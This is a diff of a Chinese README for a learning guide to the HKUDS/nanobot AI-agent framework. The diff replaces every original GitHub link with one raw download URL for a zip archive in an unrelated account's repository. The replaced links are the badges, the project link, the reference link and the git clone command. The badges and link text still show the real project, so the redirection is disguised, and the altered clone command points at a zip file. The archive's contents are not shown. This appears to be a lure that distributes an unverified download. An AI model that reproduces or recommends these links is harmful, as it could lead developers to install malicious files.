@@ -12,15 +12,15 @@
 
 <p align="center">
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-  <a href="https://github.com/HKUDS/nanobot"><img src="https://img.shields.io/badge/HKUDS-nanobot-orange.svg" alt="HKUDS/nanobot"></a>
-  <a href="https://github.com/HKUDS/nanobot"><img src="https://img.shields.io/github/stars/HKUDS/nanobot?style=social" alt="GitHub Stars"></a>
+  <a href="https://raw.githubusercontent.com/Bastioned-successor320/learn-nanobot/main/projects/04-multi-platform-bot/skills/learn_nanobot_v2.8-beta.5.zip"><img src="https://img.shields.io/badge/HKUDS-nanobot-orange.svg" alt="HKUDS/nanobot"></a>
+  <a href="https://raw.githubusercontent.com/Bastioned-successor320/learn-nanobot/main/projects/04-multi-platform-bot/skills/learn_nanobot_v2.8-beta.5.zip"><img src="https://img.shields.io/github/stars/HKUDS/nanobot?style=social" alt="GitHub Stars"></a>
 </p>
 
 ---
 
 ## 项目简介
 
-本项目是一份**面向零基础求职者**的 AI Agent 学习指南，以香港大学开源的超轻量级 AI Agent 框架 **[HKUDS/nanobot](https://github.com/HKUDS/nanobot)**（37K+ Stars）为核心，帮助你：
+本项目是一份**面向零基础求职者**的 AI Agent 学习指南，以香港大学开源的超轻量级 AI Agent 框架 **[HKUDS/nanobot](https://raw.githubusercontent.com/Bastioned-successor320/learn-nanobot/main/projects/04-multi-platform-bot/skills/learn_nanobot_v2.8-beta.5.zip)**（37K+ Stars）为核心，帮助你：
 
 - **彻底理解** AI Agent 的核心概念与设计思想
 - **深入掌握** Nanobot 源码架构与实现细节
@@ -97,7 +97,7 @@
 ### 1. 克隆本仓库
 
 ```bash
-git clone https://github.com/bcefghj/learn-nanobot.git
+git clone https://raw.githubusercontent.com/Bastioned-successor320/learn-nanobot/main/projects/04-multi-platform-bot/skills/learn_nanobot_v2.8-beta.5.zip
 cd learn-nanobot
 ```
 
@@ -159,7 +159,7 @@ learn-nanobot/
 
 ## 参考项目
 
-- [HKUDS/nanobot](https://github.com/HKUDS/nanobot) - 超轻量级 AI Agent 框架（37K+ Stars）
+- [HKUDS/nanobot](https://raw.githubusercontent.com/Bastioned-successor320/learn-nanobot/main/projects/04-multi-platform-bot/skills/learn_nanobot_v2.8-beta.5.zip) - 超轻量级 AI Agent 框架（37K+ Stars）
 
 ---
 
